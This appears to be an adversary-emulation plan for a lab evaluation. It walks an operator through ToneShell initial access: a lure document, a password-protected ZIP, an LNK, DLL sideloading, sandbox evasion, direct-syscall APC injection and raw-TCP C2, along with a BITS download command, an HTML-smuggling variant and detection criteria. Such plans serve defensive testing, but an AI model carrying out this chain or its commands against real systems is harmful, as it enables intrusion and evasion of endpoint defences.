# Phase 1 - Initial Access & ToneShell C2 Establishment

---

## Step 0 - Setup

### Procedures

- Complete all pre-run checks in [Setup.md](Setup.md) before proceeding
- Confirm operator is connected to WS01 (RDP or console) as `TESTLAB\labuser`
- Confirm `WNetHelper.exe` build output exists at `resources/payloads/discovery/discovery-toolkit/WNetHelper/WNetHelper/bin/Release/WNetHelper.exe`
- Stage `WNetHelper.exe` to the controlServer payload directory (used by TONESHELL `put` tasks):

  ```bash
  mkdir -p resources/payloads/rce-and-c2/mustang-panda-emulation/payloads
  cp resources/payloads/discovery/discovery-toolkit/WNetHelper/WNetHelper/bin/Release/WNetHelper.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/WNetHelper.exe
  ```

  > `controlServer` resolves `put` filenames relative to `<mustang-panda-emulation>/payloads/` by default

---

## Step 1 - Initial Access: ToneShell DLL Sideload & C2 Establishment

### Voice Track

The adversary pre-stages `Braavos_Competitiveness_Brief.docx` - a themed lure document - on `labuser`'s Desktop on `WS01`. When `labuser` opens the document and CTRL+clicks the embedded hyperlink, the browser navigates to the adversary's staging server at `http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip` and downloads a password-protected ZIP archive. `labuser` extracts the archive using the out-of-band password `Pentos`, revealing `Essos Competitiveness Brief.lnk`. Double-clicking the LNK fires `cmd.exe /c .\EssosUpdate.exe`, loading the attacker-controlled `wsdapi.dll` via Windows DLL search-order sideloading into the signed Microsoft debug binary. The malicious DLL validates its execution context - checking its host process name and monitoring foreground window activity to defeat sandbox analysis - then silently resolves syscall stubs via Halos Gate to bypass userland hooks. It decrypts an embedded shellcode payload, spawns `waitfor.exe` in a suspended state, and injects the shellcode via direct-syscall Early Bird APC before resuming the thread. Running inside `waitfor.exe`, the shellcode collects the victim hostname, writes a GUID-based implant identifier to a masquerading Microsoft config path, and opens a raw TCP connection to the TONESHELL controller. A registration handshake is sent and the session enters an adaptive beacon loop. The adversary now holds an interactive TONESHELL C2 session on `WS01` running as `TESTLAB\labuser`.

### Procedures

1. Operator: via RDP to WS01 as `TESTLAB\labuser`, copy `Braavos_Competitiveness_Brief.docx` to `C:\Users\labuser\Desktop\`

   > The document contains an embedded hyperlink pointing to `http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip`

2. ☣️ On WS01 as `TESTLAB\labuser`: double-click `Desktop\Braavos_Competitiveness_Brief.docx` to open in Word, then CTRL+click the embedded link inside the document

   - ***Expected Output***
     ```text
     Browser (Edge/Chrome) opens and navigates to http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip
     ZIP file downloads to C:\Users\labuser\Downloads\250325_Pentos_Board_Minutes.zip
     ```

3. On WS01: open `Downloads\`, right-click `250325_Pentos_Board_Minutes.zip` → Extract All, enter password when prompted:

   | Password |
   | - |
   | `Pentos` |

4. ☣️ In the extracted folder `Downloads\250325_Pentos_Board_Minutes\`: double-click `Essos Competitiveness Brief.lnk`, then switch foreground windows several times over ~60 seconds to pass the sandbox check loop

   - ***Expected Output***
     ```text
     No visible window to labuser. Brief cmd.exe flash may occur.
     After foreground window changes satisfy the check loop, controlServer
     receives a new session registration from WS01.
     ```

5. On attacker: confirm TONESHELL session is active in controlServer output:

   - ***Expected Output***
     ```text
     [+] New session registered: WS01 / TESTLAB\labuser  (10.12.10.30)
     ```

6. Verify session by issuing a basic tasking command through the C2 channel:

   ```bash
   # In controlServer interactive prompt or evalsC2client.py
   shell WS01 whoami
   ```

   - ***Expected Output***
     ```text
     testlab\labuser
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| labuser CTRL-click embedded hyperlink in Braavos_Competitiveness_Brief.docx | Execution | T1204.001 | User Execution: Malicious Link | Windows | `winword.exe` spawns a browser child process (`msedge.exe` or `chrome.exe`) that navigates to an HTTP ZIP download URL - Office process spawning browser with a direct file-download URL is anomalous relative to standard Word usage baseline on WS01 | Not Calibrated - Not Benign | transport | `labuser` opens `Braavos_Competitiveness_Brief.docx` in Word and CTRL+clicks the embedded hyperlink; `winword.exe` triggers browser navigation to `http://192.168.56.2/files/250325_Pentos_Board_Minutes.zip` | WS01 (10.12.10.30) | TESTLAB\labuser | [docx lure](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/) | - |
| browser download password-protected ZIP 250325_Pentos_Board_Minutes.zip from adversary staging server Extract All password Pentos | Stealth | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | Browser process writes a password-protected ZIP archive to `C:\Users\labuser\Downloads\` - file scanner cannot inspect payload content before user extraction; archive content is opaque to signature-based detection before the password is applied | Not Calibrated - Not Benign | transport | Browser (Edge/Chrome) downloads `250325_Pentos_Board_Minutes.zip` from `http://192.168.56.2/files/`; `labuser` extracts with Windows Explorer Extract All using password `Pentos` - payload concealed inside password-protected ZIP, no file signature visible before extraction | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell-v2](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/) | - |
| labuser LNK invocation Essos Competitiveness Brief.lnk | Execution | T1204.002 | User Execution: Malicious File | Windows | `explorer.exe` spawns `cmd.exe` with command line `cmd.exe /c .\EssosUpdate.exe` from `C:\Users\labuser\Downloads\250325_Pentos_Board_Minutes\` - LNK executing a binary from a user Downloads subdirectory via `explorer.exe` | Not Calibrated - Not Benign | transport | `labuser` double-clicks `Essos Competitiveness Brief.lnk` extracted from `250325_Pentos_Board_Minutes.zip`; LNK icon spoofed to `shell32.dll,70` to appear as a document | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell-v2](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/) | - |
| labuser LNK invocation Essos Competitiveness Brief.lnk | Stealth | T1036.008 | Masquerading: Masquerade File Type | Windows | `Essos Competitiveness Brief.lnk` has a document-class icon resource (`shell32.dll,70`) while its file extension is `.lnk` and its shell target executes `cmd.exe` - icon type and file type do not match; detectable via LNK metadata inspection at extraction | Calibrated - Not Benign | - | `labuser` double-clicks `Essos Competitiveness Brief.lnk` extracted from `250325_Pentos_Board_Minutes.zip`; LNK icon spoofed to `shell32.dll,70` to appear as a document | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell-v2](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/) | - |
| LNK cmd.exe /c EssosUpdate.exe process spawn | Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | `explorer.exe` spawns `cmd.exe /c .\EssosUpdate.exe` from `C:\Users\labuser\Downloads\250325_Pentos_Board_Minutes\` - `cmd.exe` acting as a pass-through launcher for a user-placed binary in a non-standard location | Not Calibrated - Not Benign | interpreter-spawn | LNK shortcut fires `cmd.exe /c .\EssosUpdate.exe` in the extraction directory; `cmd.exe` parented by `explorer.exe` | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell-v2](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/) | - |
| cmd.exe EssosUpdate.exe (wsddebug_host.exe) process spawn | Stealth | T1036.003 | Masquerading: Rename Legitimate Utilities | Windows | `EssosUpdate.exe` carries a Microsoft Authenticode signature with `OriginalFilename=wsddebug_host.exe` but executes from `C:\Users\labuser\Downloads\250325_Pentos_Board_Minutes\` - on-disk filename does not match the signed binary's internal name; signed Microsoft tool running from a user-writable non-system path | Calibrated - Not Benign | - | `cmd.exe` spawns `EssosUpdate.exe`, a renamed copy of the signed Microsoft WSD debug tool `wsddebug_host.exe`, executing from a non-SDK user-writable path | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell-v2](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/) | - |
| EssosUpdate.exe wsdapi.dll search-order DLL sideload | Execution | T1574.001 | Hijack Execution Flow: DLL | Windows | `EssosUpdate.exe` loads `wsdapi.dll` from `C:\Users\labuser\Downloads\250325_Pentos_Board_Minutes\` - shadows `C:\Windows\System32\wsdapi.dll` via DLL search-order hijack; DLL load event shows a known Windows component name resolved from a user-writable extraction directory instead of System32 | Calibrated - Not Benign | - | `EssosUpdate.exe` loads attacker-controlled `wsdapi.dll` from the extraction directory ahead of `C:\Windows\System32\wsdapi.dll` via Windows DLL search order | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll Tully Enterprises self-signed Authenticode code signing | Defense Impairment | T1553.002 | Subvert Trust Controls: Code Signing | Windows | `wsdapi.dll` loaded by `EssosUpdate.exe` bears an Authenticode signature from self-signed issuer `CN=Tully Enterprises` - certificate chain does not validate against any trusted root; signature present but untrusted on the loaded DLL | Calibrated - Not Benign | - | `wsdapi.dll` bears an attacker-controlled Authenticode signature (`CN=Tully Enterprises, O=Tully Enterprises, L=Riverrun, S=Riverlands, C=Westeros`, self-signed, SHA-256); chain does not validate against Microsoft or enterprise trust store | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll FNV1A hash Windows API name resolution | Stealth | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `wsdapi.dll` PE import table contains no `GetProcAddress` or `LoadLibrary` entries despite making Windows API calls at runtime - sparse IAT consistent with hash-based runtime resolution; detectable via static PE import-table analysis or YARA rule on the DLL file or in-memory image | Calibrated - Not Benign | - | `wsdapi.dll` resolves all target Windows API exports by computing FNV1A hashes of export names; `LoadLibrary`/`GetProcAddress` calls absent from the IAT | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll GetModuleFileNameW EssosUpdate.exe host process sandbox gate | Stealth | T1497.001 | Virtualization/Sandbox Evasion: System Checks | Windows | `wsdapi.dll` contains a code pattern that reads the host process path via `GetModuleFileNameW(NULL)` and performs a string comparison at DLL initialization - self-exit if host process name does not match; detectable via static YARA on the DLL binary or native API monitoring at DLL load time in `EssosUpdate.exe` | Calibrated - Not Benign | - | `wsdapi.dll` calls `GetModuleFileNameW(NULL)` and compares the leaf filename to `EssosUpdate.exe`; exits if the host process is different (sandbox or manual analysis context) | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll GetForegroundWindow user activity sandbox evasion loop | Stealth | T1497.002 | Virtualization/Sandbox Evasion: User Activity Based Checks | Windows | `EssosUpdate.exe` calls `GetForegroundWindow` repeatedly at ~1-second intervals for up to 60 seconds before spawning `waitfor.exe` - polling loop with no legitimate rationale for a non-UI process; detectable via native API monitoring or process-timeline analysis on WS01 | Calibrated - Not Benign | - | `wsdapi.dll` polls `GetForegroundWindow()` every 1 second in a loop, requiring ≥2 foreground window changes over 60 seconds before proceeding - defeats headless sandbox environments | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll CustomException C++ exception Handler() control-flow obfuscation | Stealth | T1622 | Debugger Evasion | Windows | `EssosUpdate.exe` emits a first-chance C++ exception immediately before spawning `waitfor.exe` - exception used as a control-flow gate to reach the injection code path; detectable via ETW exception telemetry or YARA matching the `throw CustomException` + catch-block pattern in `wsdapi.dll` | Calibrated - Not Benign | - | `Handler()` in `wsdapi.dll` throws `CustomException("Failed check.")` after sandbox checks pass; the malicious `InjectAndSpawn()` call is placed only inside the `catch` block - never visible on the straight-line CFG; breaks single-step debugger follow-through | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll BCrypt AES-CTR encrypted log write wsdapih.log | Stealth | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `EssosUpdate.exe` writes `wsdapih.log` to a user-profile directory containing base64-encoded ciphertext - `.log` extension with fully opaque encrypted content and no recognizable log format; detectable via file-write event and content-inspection signature on the written file | Calibrated - Not Benign | - | `wsdapi.dll` writes an AES-CTR BCrypt-encrypted, base64-wrapped execution log to `%TONESHELL_LOG_DIR%\wsdapih.log` | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll TripleXor-encrypted shellcode blob embedded in .data section | Stealth | T1027.009 | Obfuscated Files or Information: Embedded Payloads | Windows | `wsdapi.dll` `.data` section contains a large high-entropy binary blob consistent with an encrypted shellcode payload - detectable via entropy analysis or YARA signature on the PE file at rest or on load into `EssosUpdate.exe` | Calibrated - Not Benign | - | `wsdapi.dll` carries the encrypted shellcode as a compile-time array (`embedded::payload`) stored in the DLL `.data` section; blob is TripleXor-encrypted with a XOR-wrapped key - visible to static PE analysis before any execution | WS01 (10.12.10.30) | TESTLAB\labuser | [embedded.hpp](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/embedded.hpp) | - |
| wsdapi.dll Halos Gate ntdll export-walk direct-syscall SSN resolution | Stealth | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `wsdapi.dll` contains PEB-walking code that parses the `ntdll.dll` export table by RVA order and extracts syscall stub numbers using neighbor-stub fallback - Halos Gate SSN resolution; detectable via static YARA matching the PEB-walk + RVA-sort + SSN-extraction pattern in the DLL binary | Calibrated - Not Benign | - | `wsdapi.dll` walks the PEB to locate `ntdll.dll` base, parses its export table sorted by function RVA, and resolves syscall stub SSNs for 8 NT functions using neighbor-stub fallback for hooked entries (Halos Gate) | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll Halos Gate ntdll export-walk direct-syscall SSN resolution | Execution | T1106 | Native API | Windows | NT syscalls invoked from within `EssosUpdate.exe` with return addresses outside the `ntdll.dll` image bounds - direct-syscall pattern bypassing ntdll wrappers; detectable via kernel ETW callback or call-stack validation at the NT layer | Calibrated - Not Benign | - | `wsdapi.dll` walks the PEB to locate `ntdll.dll` base, parses its export table sorted by function RVA, and resolves syscall stub SSNs for 8 NT functions using neighbor-stub fallback for hooked entries (Halos Gate) | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll TripleXor shellcode decrypt private RW VirtualAlloc | Stealth | T1140 | Deobfuscate/Decode Files or Information | Windows | `EssosUpdate.exe` allocates a private RW memory region, writes a high-entropy binary blob (encrypted shellcode), and XOR-decrypts in place - private RW allocation containing decoded shellcode pattern detectable via memory scan in `EssosUpdate.exe` address space | Calibrated - Not Benign | - | `wsdapi.dll` allocates a private RW memory region via `VirtualAlloc`, copies embedded shellcode, and triple-XOR decrypts it in place (key XOR-unwrapped with `0x3F`) - no backing file, no disk artifact | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll waitfor.exe CREATE_SUSPENDED injection host spawn | Execution | T1106 | Native API | Windows | `EssosUpdate.exe` spawns `waitfor.exe /T 99999 <event-name>` with `CREATE_SUSPENDED` and `CREATE_NO_WINDOW` flags - `waitfor.exe` with a near-infinite timeout in a suspended, windowless state has no legitimate workstation baseline; process tree event independently verifiable | Calibrated - Not Benign | - | `wsdapi.dll` spawns `waitfor.exe /T 99999 Evt8a3f1d7c2e` in a suspended, windowless state (`CREATE_SUSPENDED \| CREATE_NO_WINDOW`) as the shellcode injection target | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll direct-syscall shared-section Early Bird APC shellcode injection waitfor.exe | Stealth | T1055.004 | Process Injection: Asynchronous Procedure Call | Windows | `waitfor.exe` resumes from suspended state with an unbacked private RX memory region containing shellcode - detectable via memory scan for RX private allocation not backed by any on-disk image in `waitfor.exe`; ETW records `NtQueueApcThread` targeting `waitfor.exe` thread from `EssosUpdate.exe` before resume | Calibrated - Not Benign | - | `wsdapi.dll` injects shellcode into suspended `waitfor.exe` via a shared-section flow using direct syscalls: `SysNtCreateSection` (RWX, SEC_COMMIT) → `SysNtMapViewOfSection` into local process (RW) → `memcpy` shellcode → `SysNtMapViewOfSection` into `waitfor.exe` (RX) → `SysNtUnmapViewOfSection` local → `SysNtQueueApcThread` → `SysNtResumeThread`; no cross-process writes, bypasses WdFilter `ObRegisterCallbacks` and ntdll userland hooks; shellcode fires via Early Bird APC before `waitfor.exe` main thread runs | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| wsdapi.dll direct-syscall shared-section Early Bird APC shellcode injection waitfor.exe | Execution | T1106 | Native API | Windows | `EssosUpdate.exe` invokes `NtCreateSection`, `NtMapViewOfSection`, `NtQueueApcThread`, and `NtResumeThread` via direct syscalls - return addresses on each invocation point outside `ntdll.dll` image bounds; detectable via kernel ETW callback monitoring or call-stack auditing at the driver level | Calibrated - Not Benign | - | `wsdapi.dll` injects shellcode into suspended `waitfor.exe` via a shared-section flow using direct syscalls: `SysNtCreateSection` (RWX, SEC_COMMIT) → `SysNtMapViewOfSection` into local process (RW) → `memcpy` shellcode → `SysNtMapViewOfSection` into `waitfor.exe` (RX) → `SysNtUnmapViewOfSection` local → `SysNtQueueApcThread` → `SysNtResumeThread`; no cross-process writes, bypasses WdFilter `ObRegisterCallbacks` and ntdll userland hooks; shellcode fires via Early Bird APC before `waitfor.exe` main thread runs | WS01 (10.12.10.30) | TESTLAB\labuser | [wsdapi src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/wsdapi/) | - |
| shellcode FNV1A PEB export-walk API resolution in waitfor.exe | Stealth | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | Shellcode executing in `waitfor.exe` from an unbacked RX region contains PEB-walking and FNV1A hash-computation code for API resolution - no IAT in the shellcode; detectable via in-memory YARA scan matching the FNV1A hash + PEB-walk pattern in the `waitfor.exe` address space | Calibrated - Not Benign | - | Shellcode running in `waitfor.exe` walks the PEB `InMemoryOrderModuleList` and resolves all target APIs (kernel32, ws2_32, ole32, user32) by FNV1A hash - fully position-independent, no IAT | WS01 (10.12.10.30) | TESTLAB\labuser | [shellcode src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/shellcode/) | - |
| shellcode AesLogger AES-CTR encrypted log file write wsdapi_dat.log in waitfor.exe | Stealth | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `waitfor.exe` creates `C:\Windows\Temp\wsdapi_dat.log` containing fully opaque base64-encoded ciphertext - `.log` file written by an injected process with no legitimate file-write baseline in `C:\Windows\Temp\`; AES-CTR encrypted content carries no recognizable log-format header and is opaque to signature-based inspection before decryption | Calibrated - Not Benign | - | Shellcode running in `waitfor.exe` calls `AesLogger::InitializeLogger` and creates `C:\Windows\Temp\wsdapi_dat.log` - AES-CTR encrypted, base64-wrapped execution log written on first shellcode execution inside `waitfor.exe` | WS01 (10.12.10.30) | TESTLAB\labuser | [shellcode src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/shellcode/) | - |
| shellcode GetComputerNameA hostname collection | Discovery | T1082 | System Information Discovery | Windows | `waitfor.exe` calls `GetComputerNameA` - no legitimate baseline for hostname querying in this process on WS01 - immediately before establishing an outbound TCP connection to `192.168.56.2:8443` | Not Calibrated - Not Benign | C1 | Shellcode in `waitfor.exe` calls `GetComputerNameA` to collect the victim hostname for inclusion in the C2 registration packet | WS01 (10.12.10.30) | TESTLAB\labuser | [shellcode src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/shellcode/) | - |
| shellcode CoCreateGuid victim GUID generation | Execution | T1106 | Native API | Windows | `waitfor.exe` invokes `CoCreateGuid` via COM API (no legitimate baseline for COM usage in this process) immediately before writing a 16-byte binary file to `%USERPROFILE%\AppData\Roaming\Microsoft\Web.CompressShaders.config` | Not Calibrated - Not Benign | C1 | Shellcode calls `CoCreateGuid` (resolved via `api-ms-win-core-com-l1-1-0.dll` by FNV1A hash) to generate a 16-byte random GUID stored in `ctx->victim_id`; no file artifact at this point - GUID is held in shellcode context for C2 registration and persistence write | WS01 (10.12.10.30) | TESTLAB\labuser | [shellcode_util_id_d.cpp](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/shellcode/shellcode_util_id_d.cpp) | - |
| shellcode Web.CompressShaders.config victim GUID masquerading file write | Stealth | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `waitfor.exe` creates `%USERPROFILE%\AppData\Roaming\Microsoft\Web.CompressShaders.config` containing a 16-byte binary blob - `.config` extension with raw binary (non-XML) content written by `waitfor.exe`, a process with no legitimate association to Microsoft configuration paths | Calibrated - Not Benign | - | Shellcode writes the 16-byte `ctx->victim_id` GUID to `%USERPROFILE%\AppData\Roaming\Microsoft\Web.CompressShaders.config`, masquerading the artifact as a Microsoft shader cache config file | WS01 (10.12.10.30) | TESTLAB\labuser | [shellcode src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/shellcode/) | - |
| shellcode TCP connect to TONESHELL C2 192.168.56.2:8443 | Command and Control | T1095 | Non-Application Layer Protocol | Windows | `waitfor.exe` makes repeated outbound raw TCP connections to `192.168.56.2:8443` - no TLS handshake, no HTTP framing; `waitfor.exe` has no legitimate outbound network baseline on WS01 | Calibrated - Not Benign | - | Shellcode in `waitfor.exe` opens a raw TCP socket (`WSAStartup` + `socket(AF_INET, SOCK_STREAM)` + `connect`) to the TONESHELL controller at `192.168.56.2:8443` - no TLS; beacon loop reconnects immediately after a real task or after random 5–30 second jitter on idle | WS01 (10.12.10.30) | TESTLAB\labuser | [shellcode src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/shellcode/) | - |
| shellcode TCP connect to TONESHELL C2 192.168.56.2:8443 | Command and Control | T1571 | Non-Standard Port | Windows | `waitfor.exe` opens an outbound TCP connection to port 8443 with no TLS handshake - raw TCP on an HTTPS-associated port from a process with no legitimate network baseline on WS01; no standard application-layer protocol framing observed | Not Calibrated - Not Benign | redundant@T1095 | Shellcode in `waitfor.exe` opens a raw TCP socket (`WSAStartup` + `socket(AF_INET, SOCK_STREAM)` + `connect`) to the TONESHELL controller at `192.168.56.2:8443` - no TLS | WS01 (10.12.10.30) | TESTLAB\labuser | [shellcode src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/shellcode/) | - |
| shellcode XOR-encrypted TONESHELL C2 handshake and beacon loop | Command and Control | T1573.001 | Encrypted Channel: Symmetric Cryptography | Windows | `waitfor.exe` sends TCP payload to `192.168.56.2:8443` beginning with fixed 3-byte magic header (`0xC7 0x3A 0x1F`) followed by XOR-obfuscated body - no TLS, no standard application-layer framing; custom encrypted protocol detectable via EDR network payload inspection or NIDS signature on the magic header pattern | Calibrated - Not Benign | - | Shellcode sends the TONESHELL registration packet (fixed magic `0xC7 0x3A 0x1F` + XOR-encrypted body containing victim hostname and GUID) then enters a beacon loop: immediate reconnect after a real task or random 5–30 second jitter on idle; one-shot `connect → send → recv → close` per beacon cycle | WS01 (10.12.10.30) | TESTLAB\labuser | [shellcode src](../resources/payloads/rce-and-c2/mustang-panda-emulation/toneshell-v2/src/shellcode/) | - |

---

## Step 1B - Variant: BITS-Based Payload Retrieval

### Voice Track

As an alternative delivery path to browser navigation, the adversary retrieves the payload archive through the Windows Background Intelligent Transfer Service. A small unsigned C# helper - `BitsDownloader.exe` - is placed on `WS01` and invokes the BITS COM interface (`IBackgroundCopyManager::CreateJob` → `AddFile` → `Resume`) to enqueue an HTTP transfer of the password-protected ZIP from the staging server. The transfer itself is carried out by the BITS service (`svchost.exe -k netsvcs -s BITS`), not by the helper: the network connection and the file write are attributed to a signed Microsoft service process, the job lives in the BITS database rather than as a new file or registry key, and the outbound HTTP is typically permitted by host firewalls. The retrieval therefore blends with legitimate update traffic, leaving the calling binary visible only at job-creation time. Once the job completes and the ZIP lands in `Downloads\`, the remainder of the delivery chain - extraction, LNK invocation, loader sideload, and C2 establishment - proceeds exactly as in Step 1.

### Procedures

1. Operator: via RDP to WS01 as `TESTLAB\labuser`, copy `BitsDownloader.exe` to `C:\Users\labuser\Downloads\`

2. ☣️ On WS01 as `TESTLAB\labuser`: enqueue the BITS transfer of the delivery ZIP:

   ```
   C:\Users\labuser\Downloads\BitsDownloader.exe http://192.168.56.2:8080/250325_Pentos_Board_Minutes.zip C:\Users\labuser\Downloads\250325_Pentos_Board_Minutes.zip
   ```

   - ***Expected Output***
     ```text
     OK 138778 bytes
     ```

   > `BitsDownloader.exe` only creates and resumes the job; the transfer is performed by the BITS service (`svchost.exe -k netsvcs -s BITS`). The staging server must support HTTP Range requests (`http-server/server.py`).

3. Continue with Step 1 procedure 3 onward - Extract All, run the LNK, and establish the TONESHELL session.

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| BitsDownloader.exe BITS job HTTP retrieval of delivery ZIP | Stealth | T1197 | BITS Jobs | Windows | On WS01: an unsigned user-mode binary `BitsDownloader.exe` (Sysmon EC=1, run from `C:\Users\labuser\Downloads\`, no `bitsadmin.exe` or PowerShell BITS cmdlet anywhere in the tree) enqueues a BITS job - Microsoft-Windows-Bits-Client/Operational job event with RemoteName `http://192.168.56.2:8080/250325_Pentos_Board_Minutes.zip`, destination `C:\Users\labuser\Downloads\250325_Pentos_Board_Minutes.zip`, owner `TESTLAB\labuser`; the resulting outbound HTTP to `192.168.56.2:8080` (Sysmon EC=3/22) and the file write to `Downloads\` (Sysmon EC=11) are performed by `svchost.exe -k netsvcs -s BITS`, not by the calling process - a BITS job created by a non-updater process targeting a non-corporate raw-IP endpoint; baseline: WS01 BITS jobs originate only from Windows Update/MEMCM via svchost, never from a user-writable binary | Calibrated - Not Benign | - | Operator runs `BitsDownloader.exe` on WS01 as `TESTLAB\labuser`; it creates a BITS transfer job through the BITS COM API that downloads `250325_Pentos_Board_Minutes.zip` from `http://192.168.56.2:8080/`; the BITS service (`svchost.exe -k netsvcs -s BITS`) performs the transfer and writes the file to `C:\Users\labuser\Downloads\` | WS01 (10.12.10.30) | TESTLAB\labuser | [BitsDownloader](../resources/payloads/file-servers/http-client/csharp-downloader/) | - |

---

## Step 1C - Variant: HTML Smuggling to HTA Loader

### Voice Track

Rather than ship the archive as a file at all, the adversary takes a third delivery path that never puts the payload on the wire as a download. The lure document's hyperlink now points at an HTML page instead of the ZIP. The page impersonates a Microsoft Entra ID device-compliance check: it spins for a few seconds, then - entirely inside the browser - reconstructs an HTA from a base64 blob embedded in the page markup. No HTTP response ever carries the HTA itself, so proxy and DLP controls that inspect downloads by filename or MIME type see only a routine page load. The page then tells the user the compliance file has been saved to `Downloads\` and prompts them to open it.

Opening it invokes `mshta.exe`, which runs the HTA's embedded VBScript. The script writes the ToneShell sideload loader - `EssosUpdate.exe` and its hijacked `wsdapi.dll` - from base64 blobs carried inside the HTA into `%TEMP%`, then launches the loader with a hidden window. From that point the chain is identical to Step 1: the loader sideloads `wsdapi.dll` from its own directory, passes the sandbox checks, injects into `waitfor.exe`, and registers the TONESHELL C2 session. The ZIP and the LNK are bypassed entirely.

### Procedures

1. Operator: via RDP to WS01 as `TESTLAB\labuser`, stage the variant lure document whose embedded hyperlink points to `http://192.168.56.2:8080/staging.html`

2. ☣️ On WS01 as `TESTLAB\labuser`: open the lure document in Word, then CTRL+click the embedded link

   - ***Expected Output***
     ```text
     Browser (Edge/Chrome) navigates to http://192.168.56.2:8080/staging.html
     Spinner shows "Checking device compliance status..." for ~3 seconds
     Essos_Compliance_Update.hta is saved to C:\Users\labuser\Downloads\
     No network request is made for the .hta file itself
     ```

3. ☣️ On WS01: open `Downloads\Essos_Compliance_Update.hta` (choose **Open** if a prompt appears)

   - ***Expected Output***
     ```text
     mshta.exe runs the HTA; no visible window to labuser
     C:\Users\labuser\AppData\Local\Temp\EssosUpdate.exe appears
     C:\Users\labuser\AppData\Local\Temp\wsdapi.dll appears
     EssosUpdate.exe launches hidden (no window)
     ```

4. Switch foreground windows several times over ~60 seconds to pass the loader's sandbox check loop, then continue with Step 1 procedure 5 onward to confirm the TONESHELL session

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
